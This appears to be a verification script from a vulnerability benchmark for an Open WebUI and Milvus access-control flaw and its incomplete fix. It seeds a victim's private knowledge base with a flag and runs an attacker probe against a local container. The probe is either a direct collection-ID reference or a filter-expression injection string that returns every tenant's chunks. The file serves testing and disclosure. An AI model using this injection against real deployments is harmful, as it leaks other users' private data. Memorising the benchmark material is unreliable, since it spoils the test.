#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0071 (open-webui-cve-2026-54019,
# CVE-2026-44560 -> CVE-2026-54019 incomplete fix, real Open WebUI + Milvus multitenancy).
#
# Mechanism: RAG retrieval route POST /api/v1/retrieval/query/collection runs a vector
# search on user-supplied collection names.
#   - seed     : collection_names=[victim private KB id] (direct ref, predictable KB id).
#                V0 0.8.12 no authz -> attacker reads victim's flag chunk.
#                V1 0.9.0  filter_accessible_collections -> 403 (CVE-2026-44560 fix).
#   - residual : collection_names=["x' or resource_id != '' or resource_id == 'x"]
#                closes the single-quoted Milvus expr resource_id == '<name>' with a
#                tautology (CVE-2026-54019). V1 passes ACL as unknown/legacy collection
#                and returns EVERY tenant's chunks incl. the victim's flag; V2 0.9.6
#                rejects the unsafe name.
# Flag channel: flag is seeded server-side into the victim's private KB (Milvus chunk) by
# this script at verify time (canary class, seeded with RUN_FLAG). Judge uses
# JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}".
# Exit: 0=effect (flag chunk in response) 10=no effect 20=env failure 30=arg error
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# dynamic host port of the openwebui service (container port 8080)
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port openwebui "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "verify: cannot resolve openwebui host port" >&2; exit 20; }
BASE="http://127.0.0.1:$PORT"

# readiness: Open WebUI /health returns 200 once the app (and Milvus dep) is up
READY=""
for _ in $(seq 1 60); do
  code="$(curl -s -o /dev/null -w '%{http_code}' "$BASE/health" 2>/dev/null || true)"
  if [[ "$code" == "200" ]]; then READY=1; break; fi
  sleep 5
done
if [[ -z "$READY" ]]; then echo "verify: openwebui not ready on $BASE" >&2; exit 20; fi

export PCB_FLAG="$RUN_FLAG"
"$PY" - "$BASE" "$RUN_FLAG" "$JUDGE_FLAG" "$MODE" <<'PYEOF'
import json, sys, time
import requests

BASE, SEED_FLAG, JUDGE, MODE = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
PROBE = "seed" if MODE == "--seed" else "residual"

INJECTION = "x' or resource_id != '' or resource_id == 'x"
# Fresh-flag plant uses SEED_FLAG. Wrong/stale overrides must not share the
# victim KB that still holds RUN_FLAG_REF, or seed@v0 would keep matching JUDGE.
KB_NAME = "Victim Private Finance" if SEED_FLAG == JUDGE else "Victim Private Finance decoy"
FLAG_DOC = (
    "CONFIDENTIAL Q3 board finance memo -- quarterly financials, private.\n"
    f"Access key: {SEED_FLAG}\n"
)
S = requests.Session()

def die_env(msg):
    print(f"ENV_FAIL: {msg}")
    sys.exit(20)

def jpost(url, *, token=None, json_body=None, files=None, timeout=60):
    h = {"Authorization": f"Bearer {token}"} if token else {}
    try:
        if files is not None:
            return S.post(url, headers=h, files=files, timeout=timeout)
        return S.post(url, headers=h, json=json_body, timeout=timeout)
    except Exception as e:  # noqa: BLE001
        die_env(f"request error {url}: {e}")

def jget(url, *, token=None, timeout=30):
    h = {"Authorization": f"Bearer {token}"} if token else {}
    try:
        return S.get(url, headers=h, timeout=timeout)
    except Exception as e:  # noqa: BLE001
        die_env(f"request error {url}: {e}")

# ---- 1) admin bootstrap: FIRST signup becomes admin; afterwards signin ----
def bootstrap_admin():
    r = jpost(f"{BASE}/api/v1/auths/signup",
              json_body={"name": "Admin Bootstrap", "email": "admin@pcb.local", "password": "admin-pass-123"})
    if r.status_code == 200:
        tok = (r.json() or {}).get("token")
        if tok:
            return tok
    r = jpost(f"{BASE}/api/v1/auths/signin",
              json_body={"email": "admin@pcb.local", "password": "admin-pass-123"})
    if r.status_code == 200:
        tok = (r.json() or {}).get("token")
        if tok:
            return tok
    die_env(f"admin bootstrap failed: {r.status_code} {r.text[:200]}")

def ensure_user(admin_tok, name, email, password, role="user"):
    jpost(f"{BASE}/api/v1/auths/add", token=admin_tok,
          json_body={"name": name, "email": email, "password": password, "role": role})
    r = jpost(f"{BASE}/api/v1/auths/signin",
              json_body={"email": email, "password": password})
    if r.status_code != 200:
        die_env(f"signin {email} failed: {r.status_code} {r.text[:200]}")
    tok = (r.json() or {}).get("token")
    if not tok:
        die_env(f"no token for {email}")
    return tok

def find_or_create_kb(victim_tok):
    # idempotent fast path: reuse an existing KB with our name if present
    try:
        r = jget(f"{BASE}/api/v1/knowledge/", token=victim_tok)
        if r.status_code == 200:
            data = r.json()
            items = data if isinstance(data, list) else (data.get("data") or [])
            for it in items or []:
                if isinstance(it, dict) and it.get("name") == KB_NAME and it.get("id"):
                    return it["id"]
    except Exception:  # noqa: BLE001
        pass
    r = jpost(f"{BASE}/api/v1/knowledge/create", token=victim_tok,
              json_body={"name": KB_NAME, "description": "private", "data": {}})
    if r.status_code != 200:
        die_env(f"KB create failed: {r.status_code} {r.text[:300]}")
    kb_id = (r.json() or {}).get("id")
    if not kb_id:
        die_env(f"KB create returned no id: {r.text[:300]}")
    return kb_id

def victim_self_read(victim_tok, kb_id):
    r = jpost(f"{BASE}/api/v1/retrieval/query/collection", token=victim_tok,
              json_body={"collection_names": [kb_id], "query": "quarterly financials access key", "k": 10},
              timeout=90)
    return r.status_code == 200 and SEED_FLAG in (r.text or "")

def seed_victim_flag(victim_tok, kb_id):
    if victim_self_read(victim_tok, kb_id):
        return  # already embedded (idempotent across submissions)
    files = {"file": ("q3_finance_memo.txt", FLAG_DOC, "text/plain")}
    r = jpost(f"{BASE}/api/v1/files/", token=victim_tok, files=files, timeout=120)
    if r.status_code != 200:
        die_env(f"file upload failed: {r.status_code} {r.text[:300]}")
    file_id = (r.json() or {}).get("id")
    if not file_id:
        die_env(f"file upload returned no id: {r.text[:300]}")
    r = jpost(f"{BASE}/api/v1/knowledge/{kb_id}/file/add", token=victim_tok,
              json_body={"file_id": file_id}, timeout=300)
    if r.status_code != 200:
        die_env(f"file/add failed: {r.status_code} {r.text[:300]}")
    for _ in range(50):  # wait for local embedding into Milvus (resource_id = kb_id)
        if victim_self_read(victim_tok, kb_id):
            return
        time.sleep(5)
    die_env("flag chunk never became searchable for its owner (embedding timeout)")

# ---- 2) ensure seeded state (admin / victim KB with flag / attacker) ----
admin_tok = bootstrap_admin()
victim_tok = ensure_user(admin_tok, "Victim", "victim@pcb.local", "victim-pass-123", role="user")
attacker_tok = ensure_user(admin_tok, "Attacker", "attacker@pcb.local", "attacker-pass-123", role="user")
kb_id = find_or_create_kb(victim_tok)
seed_victim_flag(victim_tok, kb_id)
print(f"SEEDED kb_id={kb_id}")

# ---- 3) attacker probe ----
collection_names = [kb_id] if PROBE == "seed" else [INJECTION]
r = jpost(f"{BASE}/api/v1/retrieval/query/collection", token=attacker_tok,
          json_body={"collection_names": collection_names, "query": "quarterly financials access key", "k": 10},
          timeout=90)
body = r.text or ""
print(f"PROBE={PROBE} http_status={r.status_code} len={len(body)}")
print(body[:800])
if r.status_code >= 500:
    die_env(f"retrieval 5xx: {body[:300]}")
if r.status_code == 200 and JUDGE in body:
    sys.exit(0)   # effect: attacker read the victim's flag chunk
sys.exit(10)      # blocked / not observed
PYEOF
rc=$?
exit $rc
